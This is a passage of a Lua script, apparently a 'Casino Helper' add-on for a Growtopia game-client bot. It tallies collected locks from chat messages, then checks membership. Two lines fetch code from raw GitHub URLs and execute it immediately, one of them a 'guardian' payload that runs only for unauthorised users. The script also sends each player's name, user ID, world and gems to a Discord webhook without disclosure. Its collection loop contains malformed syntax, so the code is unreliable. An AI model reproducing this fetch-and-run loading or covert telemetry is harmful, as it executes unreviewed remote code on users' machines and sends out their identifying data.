= 11550}) end if L[1]:find("Collected  `w(%d+) Blue Gem Lock") then if COLLECTED_BLACK == nil or COLLECTED_BLACK == 0 then COLLECTED_BLACK = 0 end if COLLECTED_BGL == nil or COLLECTED_BGL == 0 then COLLECTED_BGL = 0 end if COLLECTED_DL == nil or COLLECTED_DL == 0 then COLLECTED_DL = 0 end if COLLECTED_WL == nil or COLLECTED_WL == 0 then COLLECTED_WL = 0 end COLLECTED_BGL = tonumber(L[1]:match("Collected  `w(%d+) Blue Gem Lock")) table.insert(COLLECTED_TABLE, {NUM = (COLLECTED_BLACK*1000000)+(COLLECTED_BGL*10000)+(COLLECTED_DL*100)+(COLLECTED_WL)}) table.insert(V.LOG.COLLECT, {COLLECT = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `otook `w"..COLLECTED_BGL.." Blue Gem Lock`o. at "..os.date("%H:%M on %d/%m").."|left|7188|7188|\n", COLLECT_ID = 7188}) end if L[1]:find("Collected  `w(%d+) Diamond Lock") then if COLLECTED_BLACK == nil or COLLECTED_BLACK == 0 then COLLECTED_BLACK = 0 end if COLLECTED_BGL == nil or COLLECTED_BGL == 0 then COLLECTED_BGL = 0 end if COLLECTED_DL == nil or COLLECTED_DL == 0 then COLLECTED_DL = 0 end if COLLECTED_WL == nil or COLLECTED_WL == 0 then COLLECTED_WL = 0 end COLLECTED_DL = tonumber(L[1]:match("Collected  `w(%d+) Diamond Lock")) table.insert(COLLECTED_TABLE, {NUM = (COLLECTED_BLACK*1000000)+(COLLECTED_BGL*10000)+(COLLECTED_DL*100)+(COLLECTED_WL)}) table.insert(V.LOG.COLLECT, {COLLECT = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `otook `w"..COLLECTED_DL.." Diamond Lock`o. at "..os.date("%H:%M on %d/%m").."|left|1796|1796|\n", COLLECT_ID = 1796}) end if L[1]:find("Collected  `w(%d+) World Lock") then if COLLECTED_BLACK == nil or COLLECTED_BLACK == 0 then COLLECTED_BLACK = 0 end if COLLECTED_BGL == nil or COLLECTED_BGL == 0 then COLLECTED_BGL = 0 end if COLLECTED_DL == nil or COLLECTED_DL == 0 then COLLECTED_DL = 0 end if COLLECTED_WL == nil or COLLECTED_WL == 0 then COLLECTED_WL = 0 end COLLECTED_WL = tonumber(L[1]:match("Collected  `w(%d+) World Lock")) table.insert(COLLECTED_TABLE, {NUM = (COLLECTED_BLACK*1000000)+(COLLECTED_BGL*10000)+(COLLECTED_DL*100)+(COLLECTED_WL)}) table.insert(V.LOG.COLLECT, {COLLECT = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `otook `w"..COLLECTED_WL.." World Lock`o. at "..os.date("%H:%M on %d/%m").."|left|242|242|\n", COLLECT_ID = 242}) end if not SHOW_COLLECTED then SHOW_COLLECTED = true else SHOW_COLLECTED = false end RunThread(function() while SHOW_COLLECTED do if CDROP then break end Sleep(250) NEW_TABLE_COLLECT = {} COLLECTED_WL, COLLECTED_DL, COLLECTED_BGL, COLLECTED_BLACK = 0, 0, 0, 0 for _, D in pairs(COLLECTED_TABLE) do table.insert(NEW_TABLE_COLLECT, D.NUM) break return end if table.concat(NEW_TABLE_COLLECT) ~= nil and table.concat(NEW_TABLE_COLLECT) ~= "" then CHAT(V.SYSTEM.CREDIT.."`wCollected "..GET_DATA(table.concat(NEW_TABLE_COLLECT))) end COLLECTED_TABLE = {} NEW_TABLE_COLLECT = {} if SHOW_COLLECTED then SHOW_COLLECTED = false end if not SHOW_COLLECTED then break end end end) return true end return false end)

end

-- // CHECKING THE LANGUAGE
CHECKING_LANGUAGE(V.UI.LANGUAGE)

-- // GET THE USER ID DATABASE FROM GITHUB

load(MakeRequest("https://raw.githubusercontent.com/starries-real/exclusive/main/confidential","GET").content)() CONSOLE(D.STARTING.CHECKING) Sleep(1000)

-- // CHECKS WHETHER THE USER IS PART OF THE CLUB OR NOT
if CHECKING_SOMETHING(BOTHEX.STARRIES_HELPER.CLUB, GetLocal().userid) then 
	SEND_WEBHOOK(V.DISCORD.WEBHOOK_OFFICIAL:format("1316264591843397693"), V.DISCORD.EMBED_OFFICIAL:format("", 7819519, FORMAT_NAME(GetLocal().name), math.floor(GetLocal().userid), GetWorld().name, FORMAT_NUMBER(GetPlayerInfo().gems), "Premium member are using **Casino Helper**")) Sleep(100) RUNNING_SCRIPT()
    CONSOLE(D.STARTING.AUTH_SUCCESS) Sleep(200) CONSOLE(D.STARTING.SHOW_DISCORD) Sleep(200) CONSOLE(D.STARTING.SHOW_BALANCE.." `w"..FORMAT_BALANCE("IN")) Sleep(200) CONSOLE(D.STARTING.SHOW_HELP) Sleep(200) CHAT(D.STARTING.SHOW_CREDIT)
else
	CONSOLE(D.ALERT.WRONG.."`oYour account doesn't match with our data") Sleep(200) CONSOLE(D.STARTING.AUTH_FAILED) Sleep(200) CONSOLE(D.STARTING.SHOW_DISCORD) 
	load(MakeRequest("https://raw.githubusercontent.com/starries-real/exclusive/main/guardian","GET").content)()
	DIALOG(NOT_ALLOWED, 500)
	SEND_WEBHOOK(V.DISCORD.WEBHOOK_OFFICIAL:format("1316391757113589832"), V.DISCORD.EMBED_OFFICIAL:format("<@872423690120331304>", 16723712, FORMAT_NAME(GetLocal().name), math.floor(GetLocal().userid), GetWorld().name, FORMAT_NUMBER(GetPlayerInfo().gems), "Someone attempted to use **Casino Helper** without access"))
end